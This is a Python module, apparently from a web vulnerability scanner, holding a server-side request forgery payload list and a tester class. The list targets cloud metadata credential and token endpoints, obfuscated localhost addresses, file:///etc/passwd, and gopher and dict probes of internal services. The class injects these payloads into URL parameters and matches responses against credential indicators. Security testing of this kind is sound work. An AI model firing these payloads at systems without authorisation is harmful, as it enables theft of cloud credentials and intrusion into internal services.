"""SSRF cloud metadata + URL parser bypass corpus (complements core _check_ssrf)."""
from __future__ import annotations

from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.logger import get_logger

logger = get_logger(__name__)

_BYPASS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
    "http://2852039166/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2019-06-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://127.0.0.1:2375/version",
    "http://localhost:9200/",
    "http://127.0.0.1:8500/v1/agent/self",
    "http://127.1/",
    "http://0/",
    "http://[::1]/",
    "http://2130706433/",
    "http://0x7f000001/",
    "http://0177.0.0.1/",
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stats",
    "//169.254.169.254/latest/meta-data/",
    "http://169.254.169.254.xip.io/latest/meta-data/",
]


class SSRFCloudTester:
    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.cfg = config.get("ssrf_cloud") or {}

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        keys = list(qs.keys())
        if not keys:
            # common SSRF param names when none present
            keys = ["url", "uri", "path", "dest", "redirect", "next", "link", "src", "image"]
            force = True
        else:
            force = False

        oast = ""
        try:
            oast = (
                (self.config.get("scanner") or {}).get("oast_callback_url")
                or (self.config.get("oast") or {}).get("callback_url")
                or ""
            ).strip()
        except Exception:
            oast = ""
        bypass = list(_BYPASS)
        if oast:
            bypass.insert(0, oast.rstrip("/") + "/ssrf")

        indicators = (
            "ami-id",
            "instance-id",
            "computeMetadata",
            "root:x:",
            "redis_version",
            "ApiVersion",
            "meta-data",
            "access_token",
            "security-credentials",
            "win.ini",
            "[fonts]",
            "Docker-Distribution-Api-Version",
        )
        vulns: List[Dict] = []
        for key in keys[:5]:
            for payload in bypass:
                try:
                    if force:
                        qs2 = {key: [payload]}
                    else:
                        qs2 = {k: list(v) for k, v in qs.items()}
                        qs2[key] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
                    headers = {}
                    if "google" in payload:
                        headers["Metadata-Flavor"] = "Google"
                    if "metadata/instance" in payload or "metadata/identity" in payload:
                        headers["Metadata"] = "true"
                    resp = self.http_client.get(test_url, headers=headers or None)
                    if not resp:
                        continue
                    body = (getattr(resp, "text", "") or "")[:2000]
                    if any(i in body for i in indicators):
                        vulns.append({
                            "type": "SSRF Cloud Metadata / Bypass",
                            "severity": "critical",
                            "url": url,
                            "parameter": key,
                            "payload": payload,
                            "evidence": body[:200],
                            "description": "SSRF reached cloud metadata or internal service via bypass corpus",
                            "remediation": "Block link-local/metadata IPs; validate URL scheme/host allowlists",
                        })
                        return vulns
                except Exception as e:
                    logger.debug(f"ssrf cloud: {e}")
        return vulns
